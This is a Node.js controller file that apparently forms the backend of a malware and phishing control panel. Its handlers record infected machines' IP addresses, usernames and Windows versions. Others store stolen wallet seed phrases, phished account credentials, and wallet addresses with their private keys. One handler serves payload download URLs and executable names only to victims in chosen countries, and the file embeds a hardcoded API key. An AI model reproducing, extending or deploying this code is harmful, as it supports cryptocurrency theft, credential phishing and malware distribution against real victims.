const LoaderModel   = require ('../models/LoaderModel');
const MnemonicModel = require ('../models/MnemonicModel');
const PhishingModel = require ('../models/PhishingModel');
const PrivateModel  = require ('../models/PrivateModel');
const PanelModel  = require ('../models/PanelSettings');

const IPData = require('ipdata').default;
const ipdata = new IPData('10505a1baa1e4f405549265920ad2170a42044737b5e4ffac40beb90');

const moment = require ('moment');

class AddController {
    async AddToPanelLoader (req, res) {
        try {
            const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
            const response = await ipdata.lookup(ip);
            const reqCountry = response.country_code;
            const SearchResult = await LoaderModel.findOne ({address: ip});
            if (SearchResult)
                return res.status(200).json({message: "Already exists"});
            const DbKey =
                new LoaderModel({time: moment().format('DD.MM.YYYY'), nowtime: moment().format('HH:mm:ss'),
                country: reqCountry, address: ip, username: req.body.username, windows: req.body.windows
            })
            await DbKey.save();
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async AddToPanelMnemonic (req, res) {
        try {
            const SearchResult = await MnemonicModel.findOne ({address: req.body.phrase});
            if (SearchResult)
                return res.status(200).json({message: "Already exists"});
            const DbKey =
                new MnemonicModel({time: moment().format('DD.MM.YYYY'), nowtime: moment().format('HH:mm:ss'),
                    phrase: req.body.phrase
                })
            await DbKey.save();
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async AddToPanelPhishing (req, res) {
        try {
            const SearchResult = await PhishingModel.findOne ({address: req.body.account});
            if (SearchResult)
                return res.status(200).json({message: "Already exists"});
            const DbKey =
                new PhishingModel({time: moment().format('DD.MM.YYYY'), nowtime: moment().format('HH:mm:ss'),
                    account: req.body.account, service: req.body.service
                })
            await DbKey.save();
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async AddToPanelPrivate (req, res) {
        try {
            const SearchResult = await PrivateModel.findOne ({address: req.body.address});
            if (SearchResult)
                return res.status(200).json({message: "Already exists"});
            const DbKey =
                new PrivateModel({time: moment().format('DD.MM.YYYY'), nowtime: moment().format('HH:mm:ss'),
                    address: req.body.address, private: req.body.private
                })
            await DbKey.save();
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async AddToPanelSettings (req, res) {
        try {
            const SearchResult = await PanelModel.findOne({service: req.body.service});
            if (SearchResult) {
                return res.status(200).json({message: "Already exists"});
            }

            const url = new URL(req.body.service);
            const pathParts = url.pathname.split('/');
            const filename = pathParts[pathParts.length - 1];

            const DbKey = new PanelModel({
                time: moment().format('DD.MM.YYYY'),
                service: req.body.service,
                exe: filename,
                country: req.body.country
            });

            await DbKey.save();
            return res.status(200).json({success: true});
        } catch (e) {
            res.status(400).json({message: e});
        }
    }
    async checkTileAndReturnData(req, res) {
        try {

            const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
            const response = await ipdata.lookup(ip);
            const reqCountry = response.country_code;
            // Поиск плитки по предоставленному идентификатору
            const tile = await PanelModel.findById(req.params.id);
            if (!tile) {
                return res.status(404).json({ message: "Tile not found" });
            }

            // Проверка страны клиента
            const tileCountries = tile.country.split(', ').map(item => item.trim());
            if (tileCountries.includes(reqCountry)) {
                // Запись данных в базу данных
                const SearchResult = await LoaderModel.findOne ({address: ip});
                if (SearchResult)
                    return res.status(200).json({message: "Already exists"});
                const DbKey =
                    new LoaderModel({time: moment().format('DD.MM.YYYY'), nowtime: moment().format('HH:mm:ss'),
                        country: reqCountry, address: ip, username: req.body.username, windows: req.body.windows, client: req.params.id
                    })
                await DbKey.save();

                // Возврат service и exe
                return res.json({ service: tile.service, exe: tile.exe });
            } else {
                return res.status(403).json(reqCountry).end();
            }
        } catch (e) {
            res.status(500).json({ message: e.message });
        }
    }


}
module.exports = new AddController()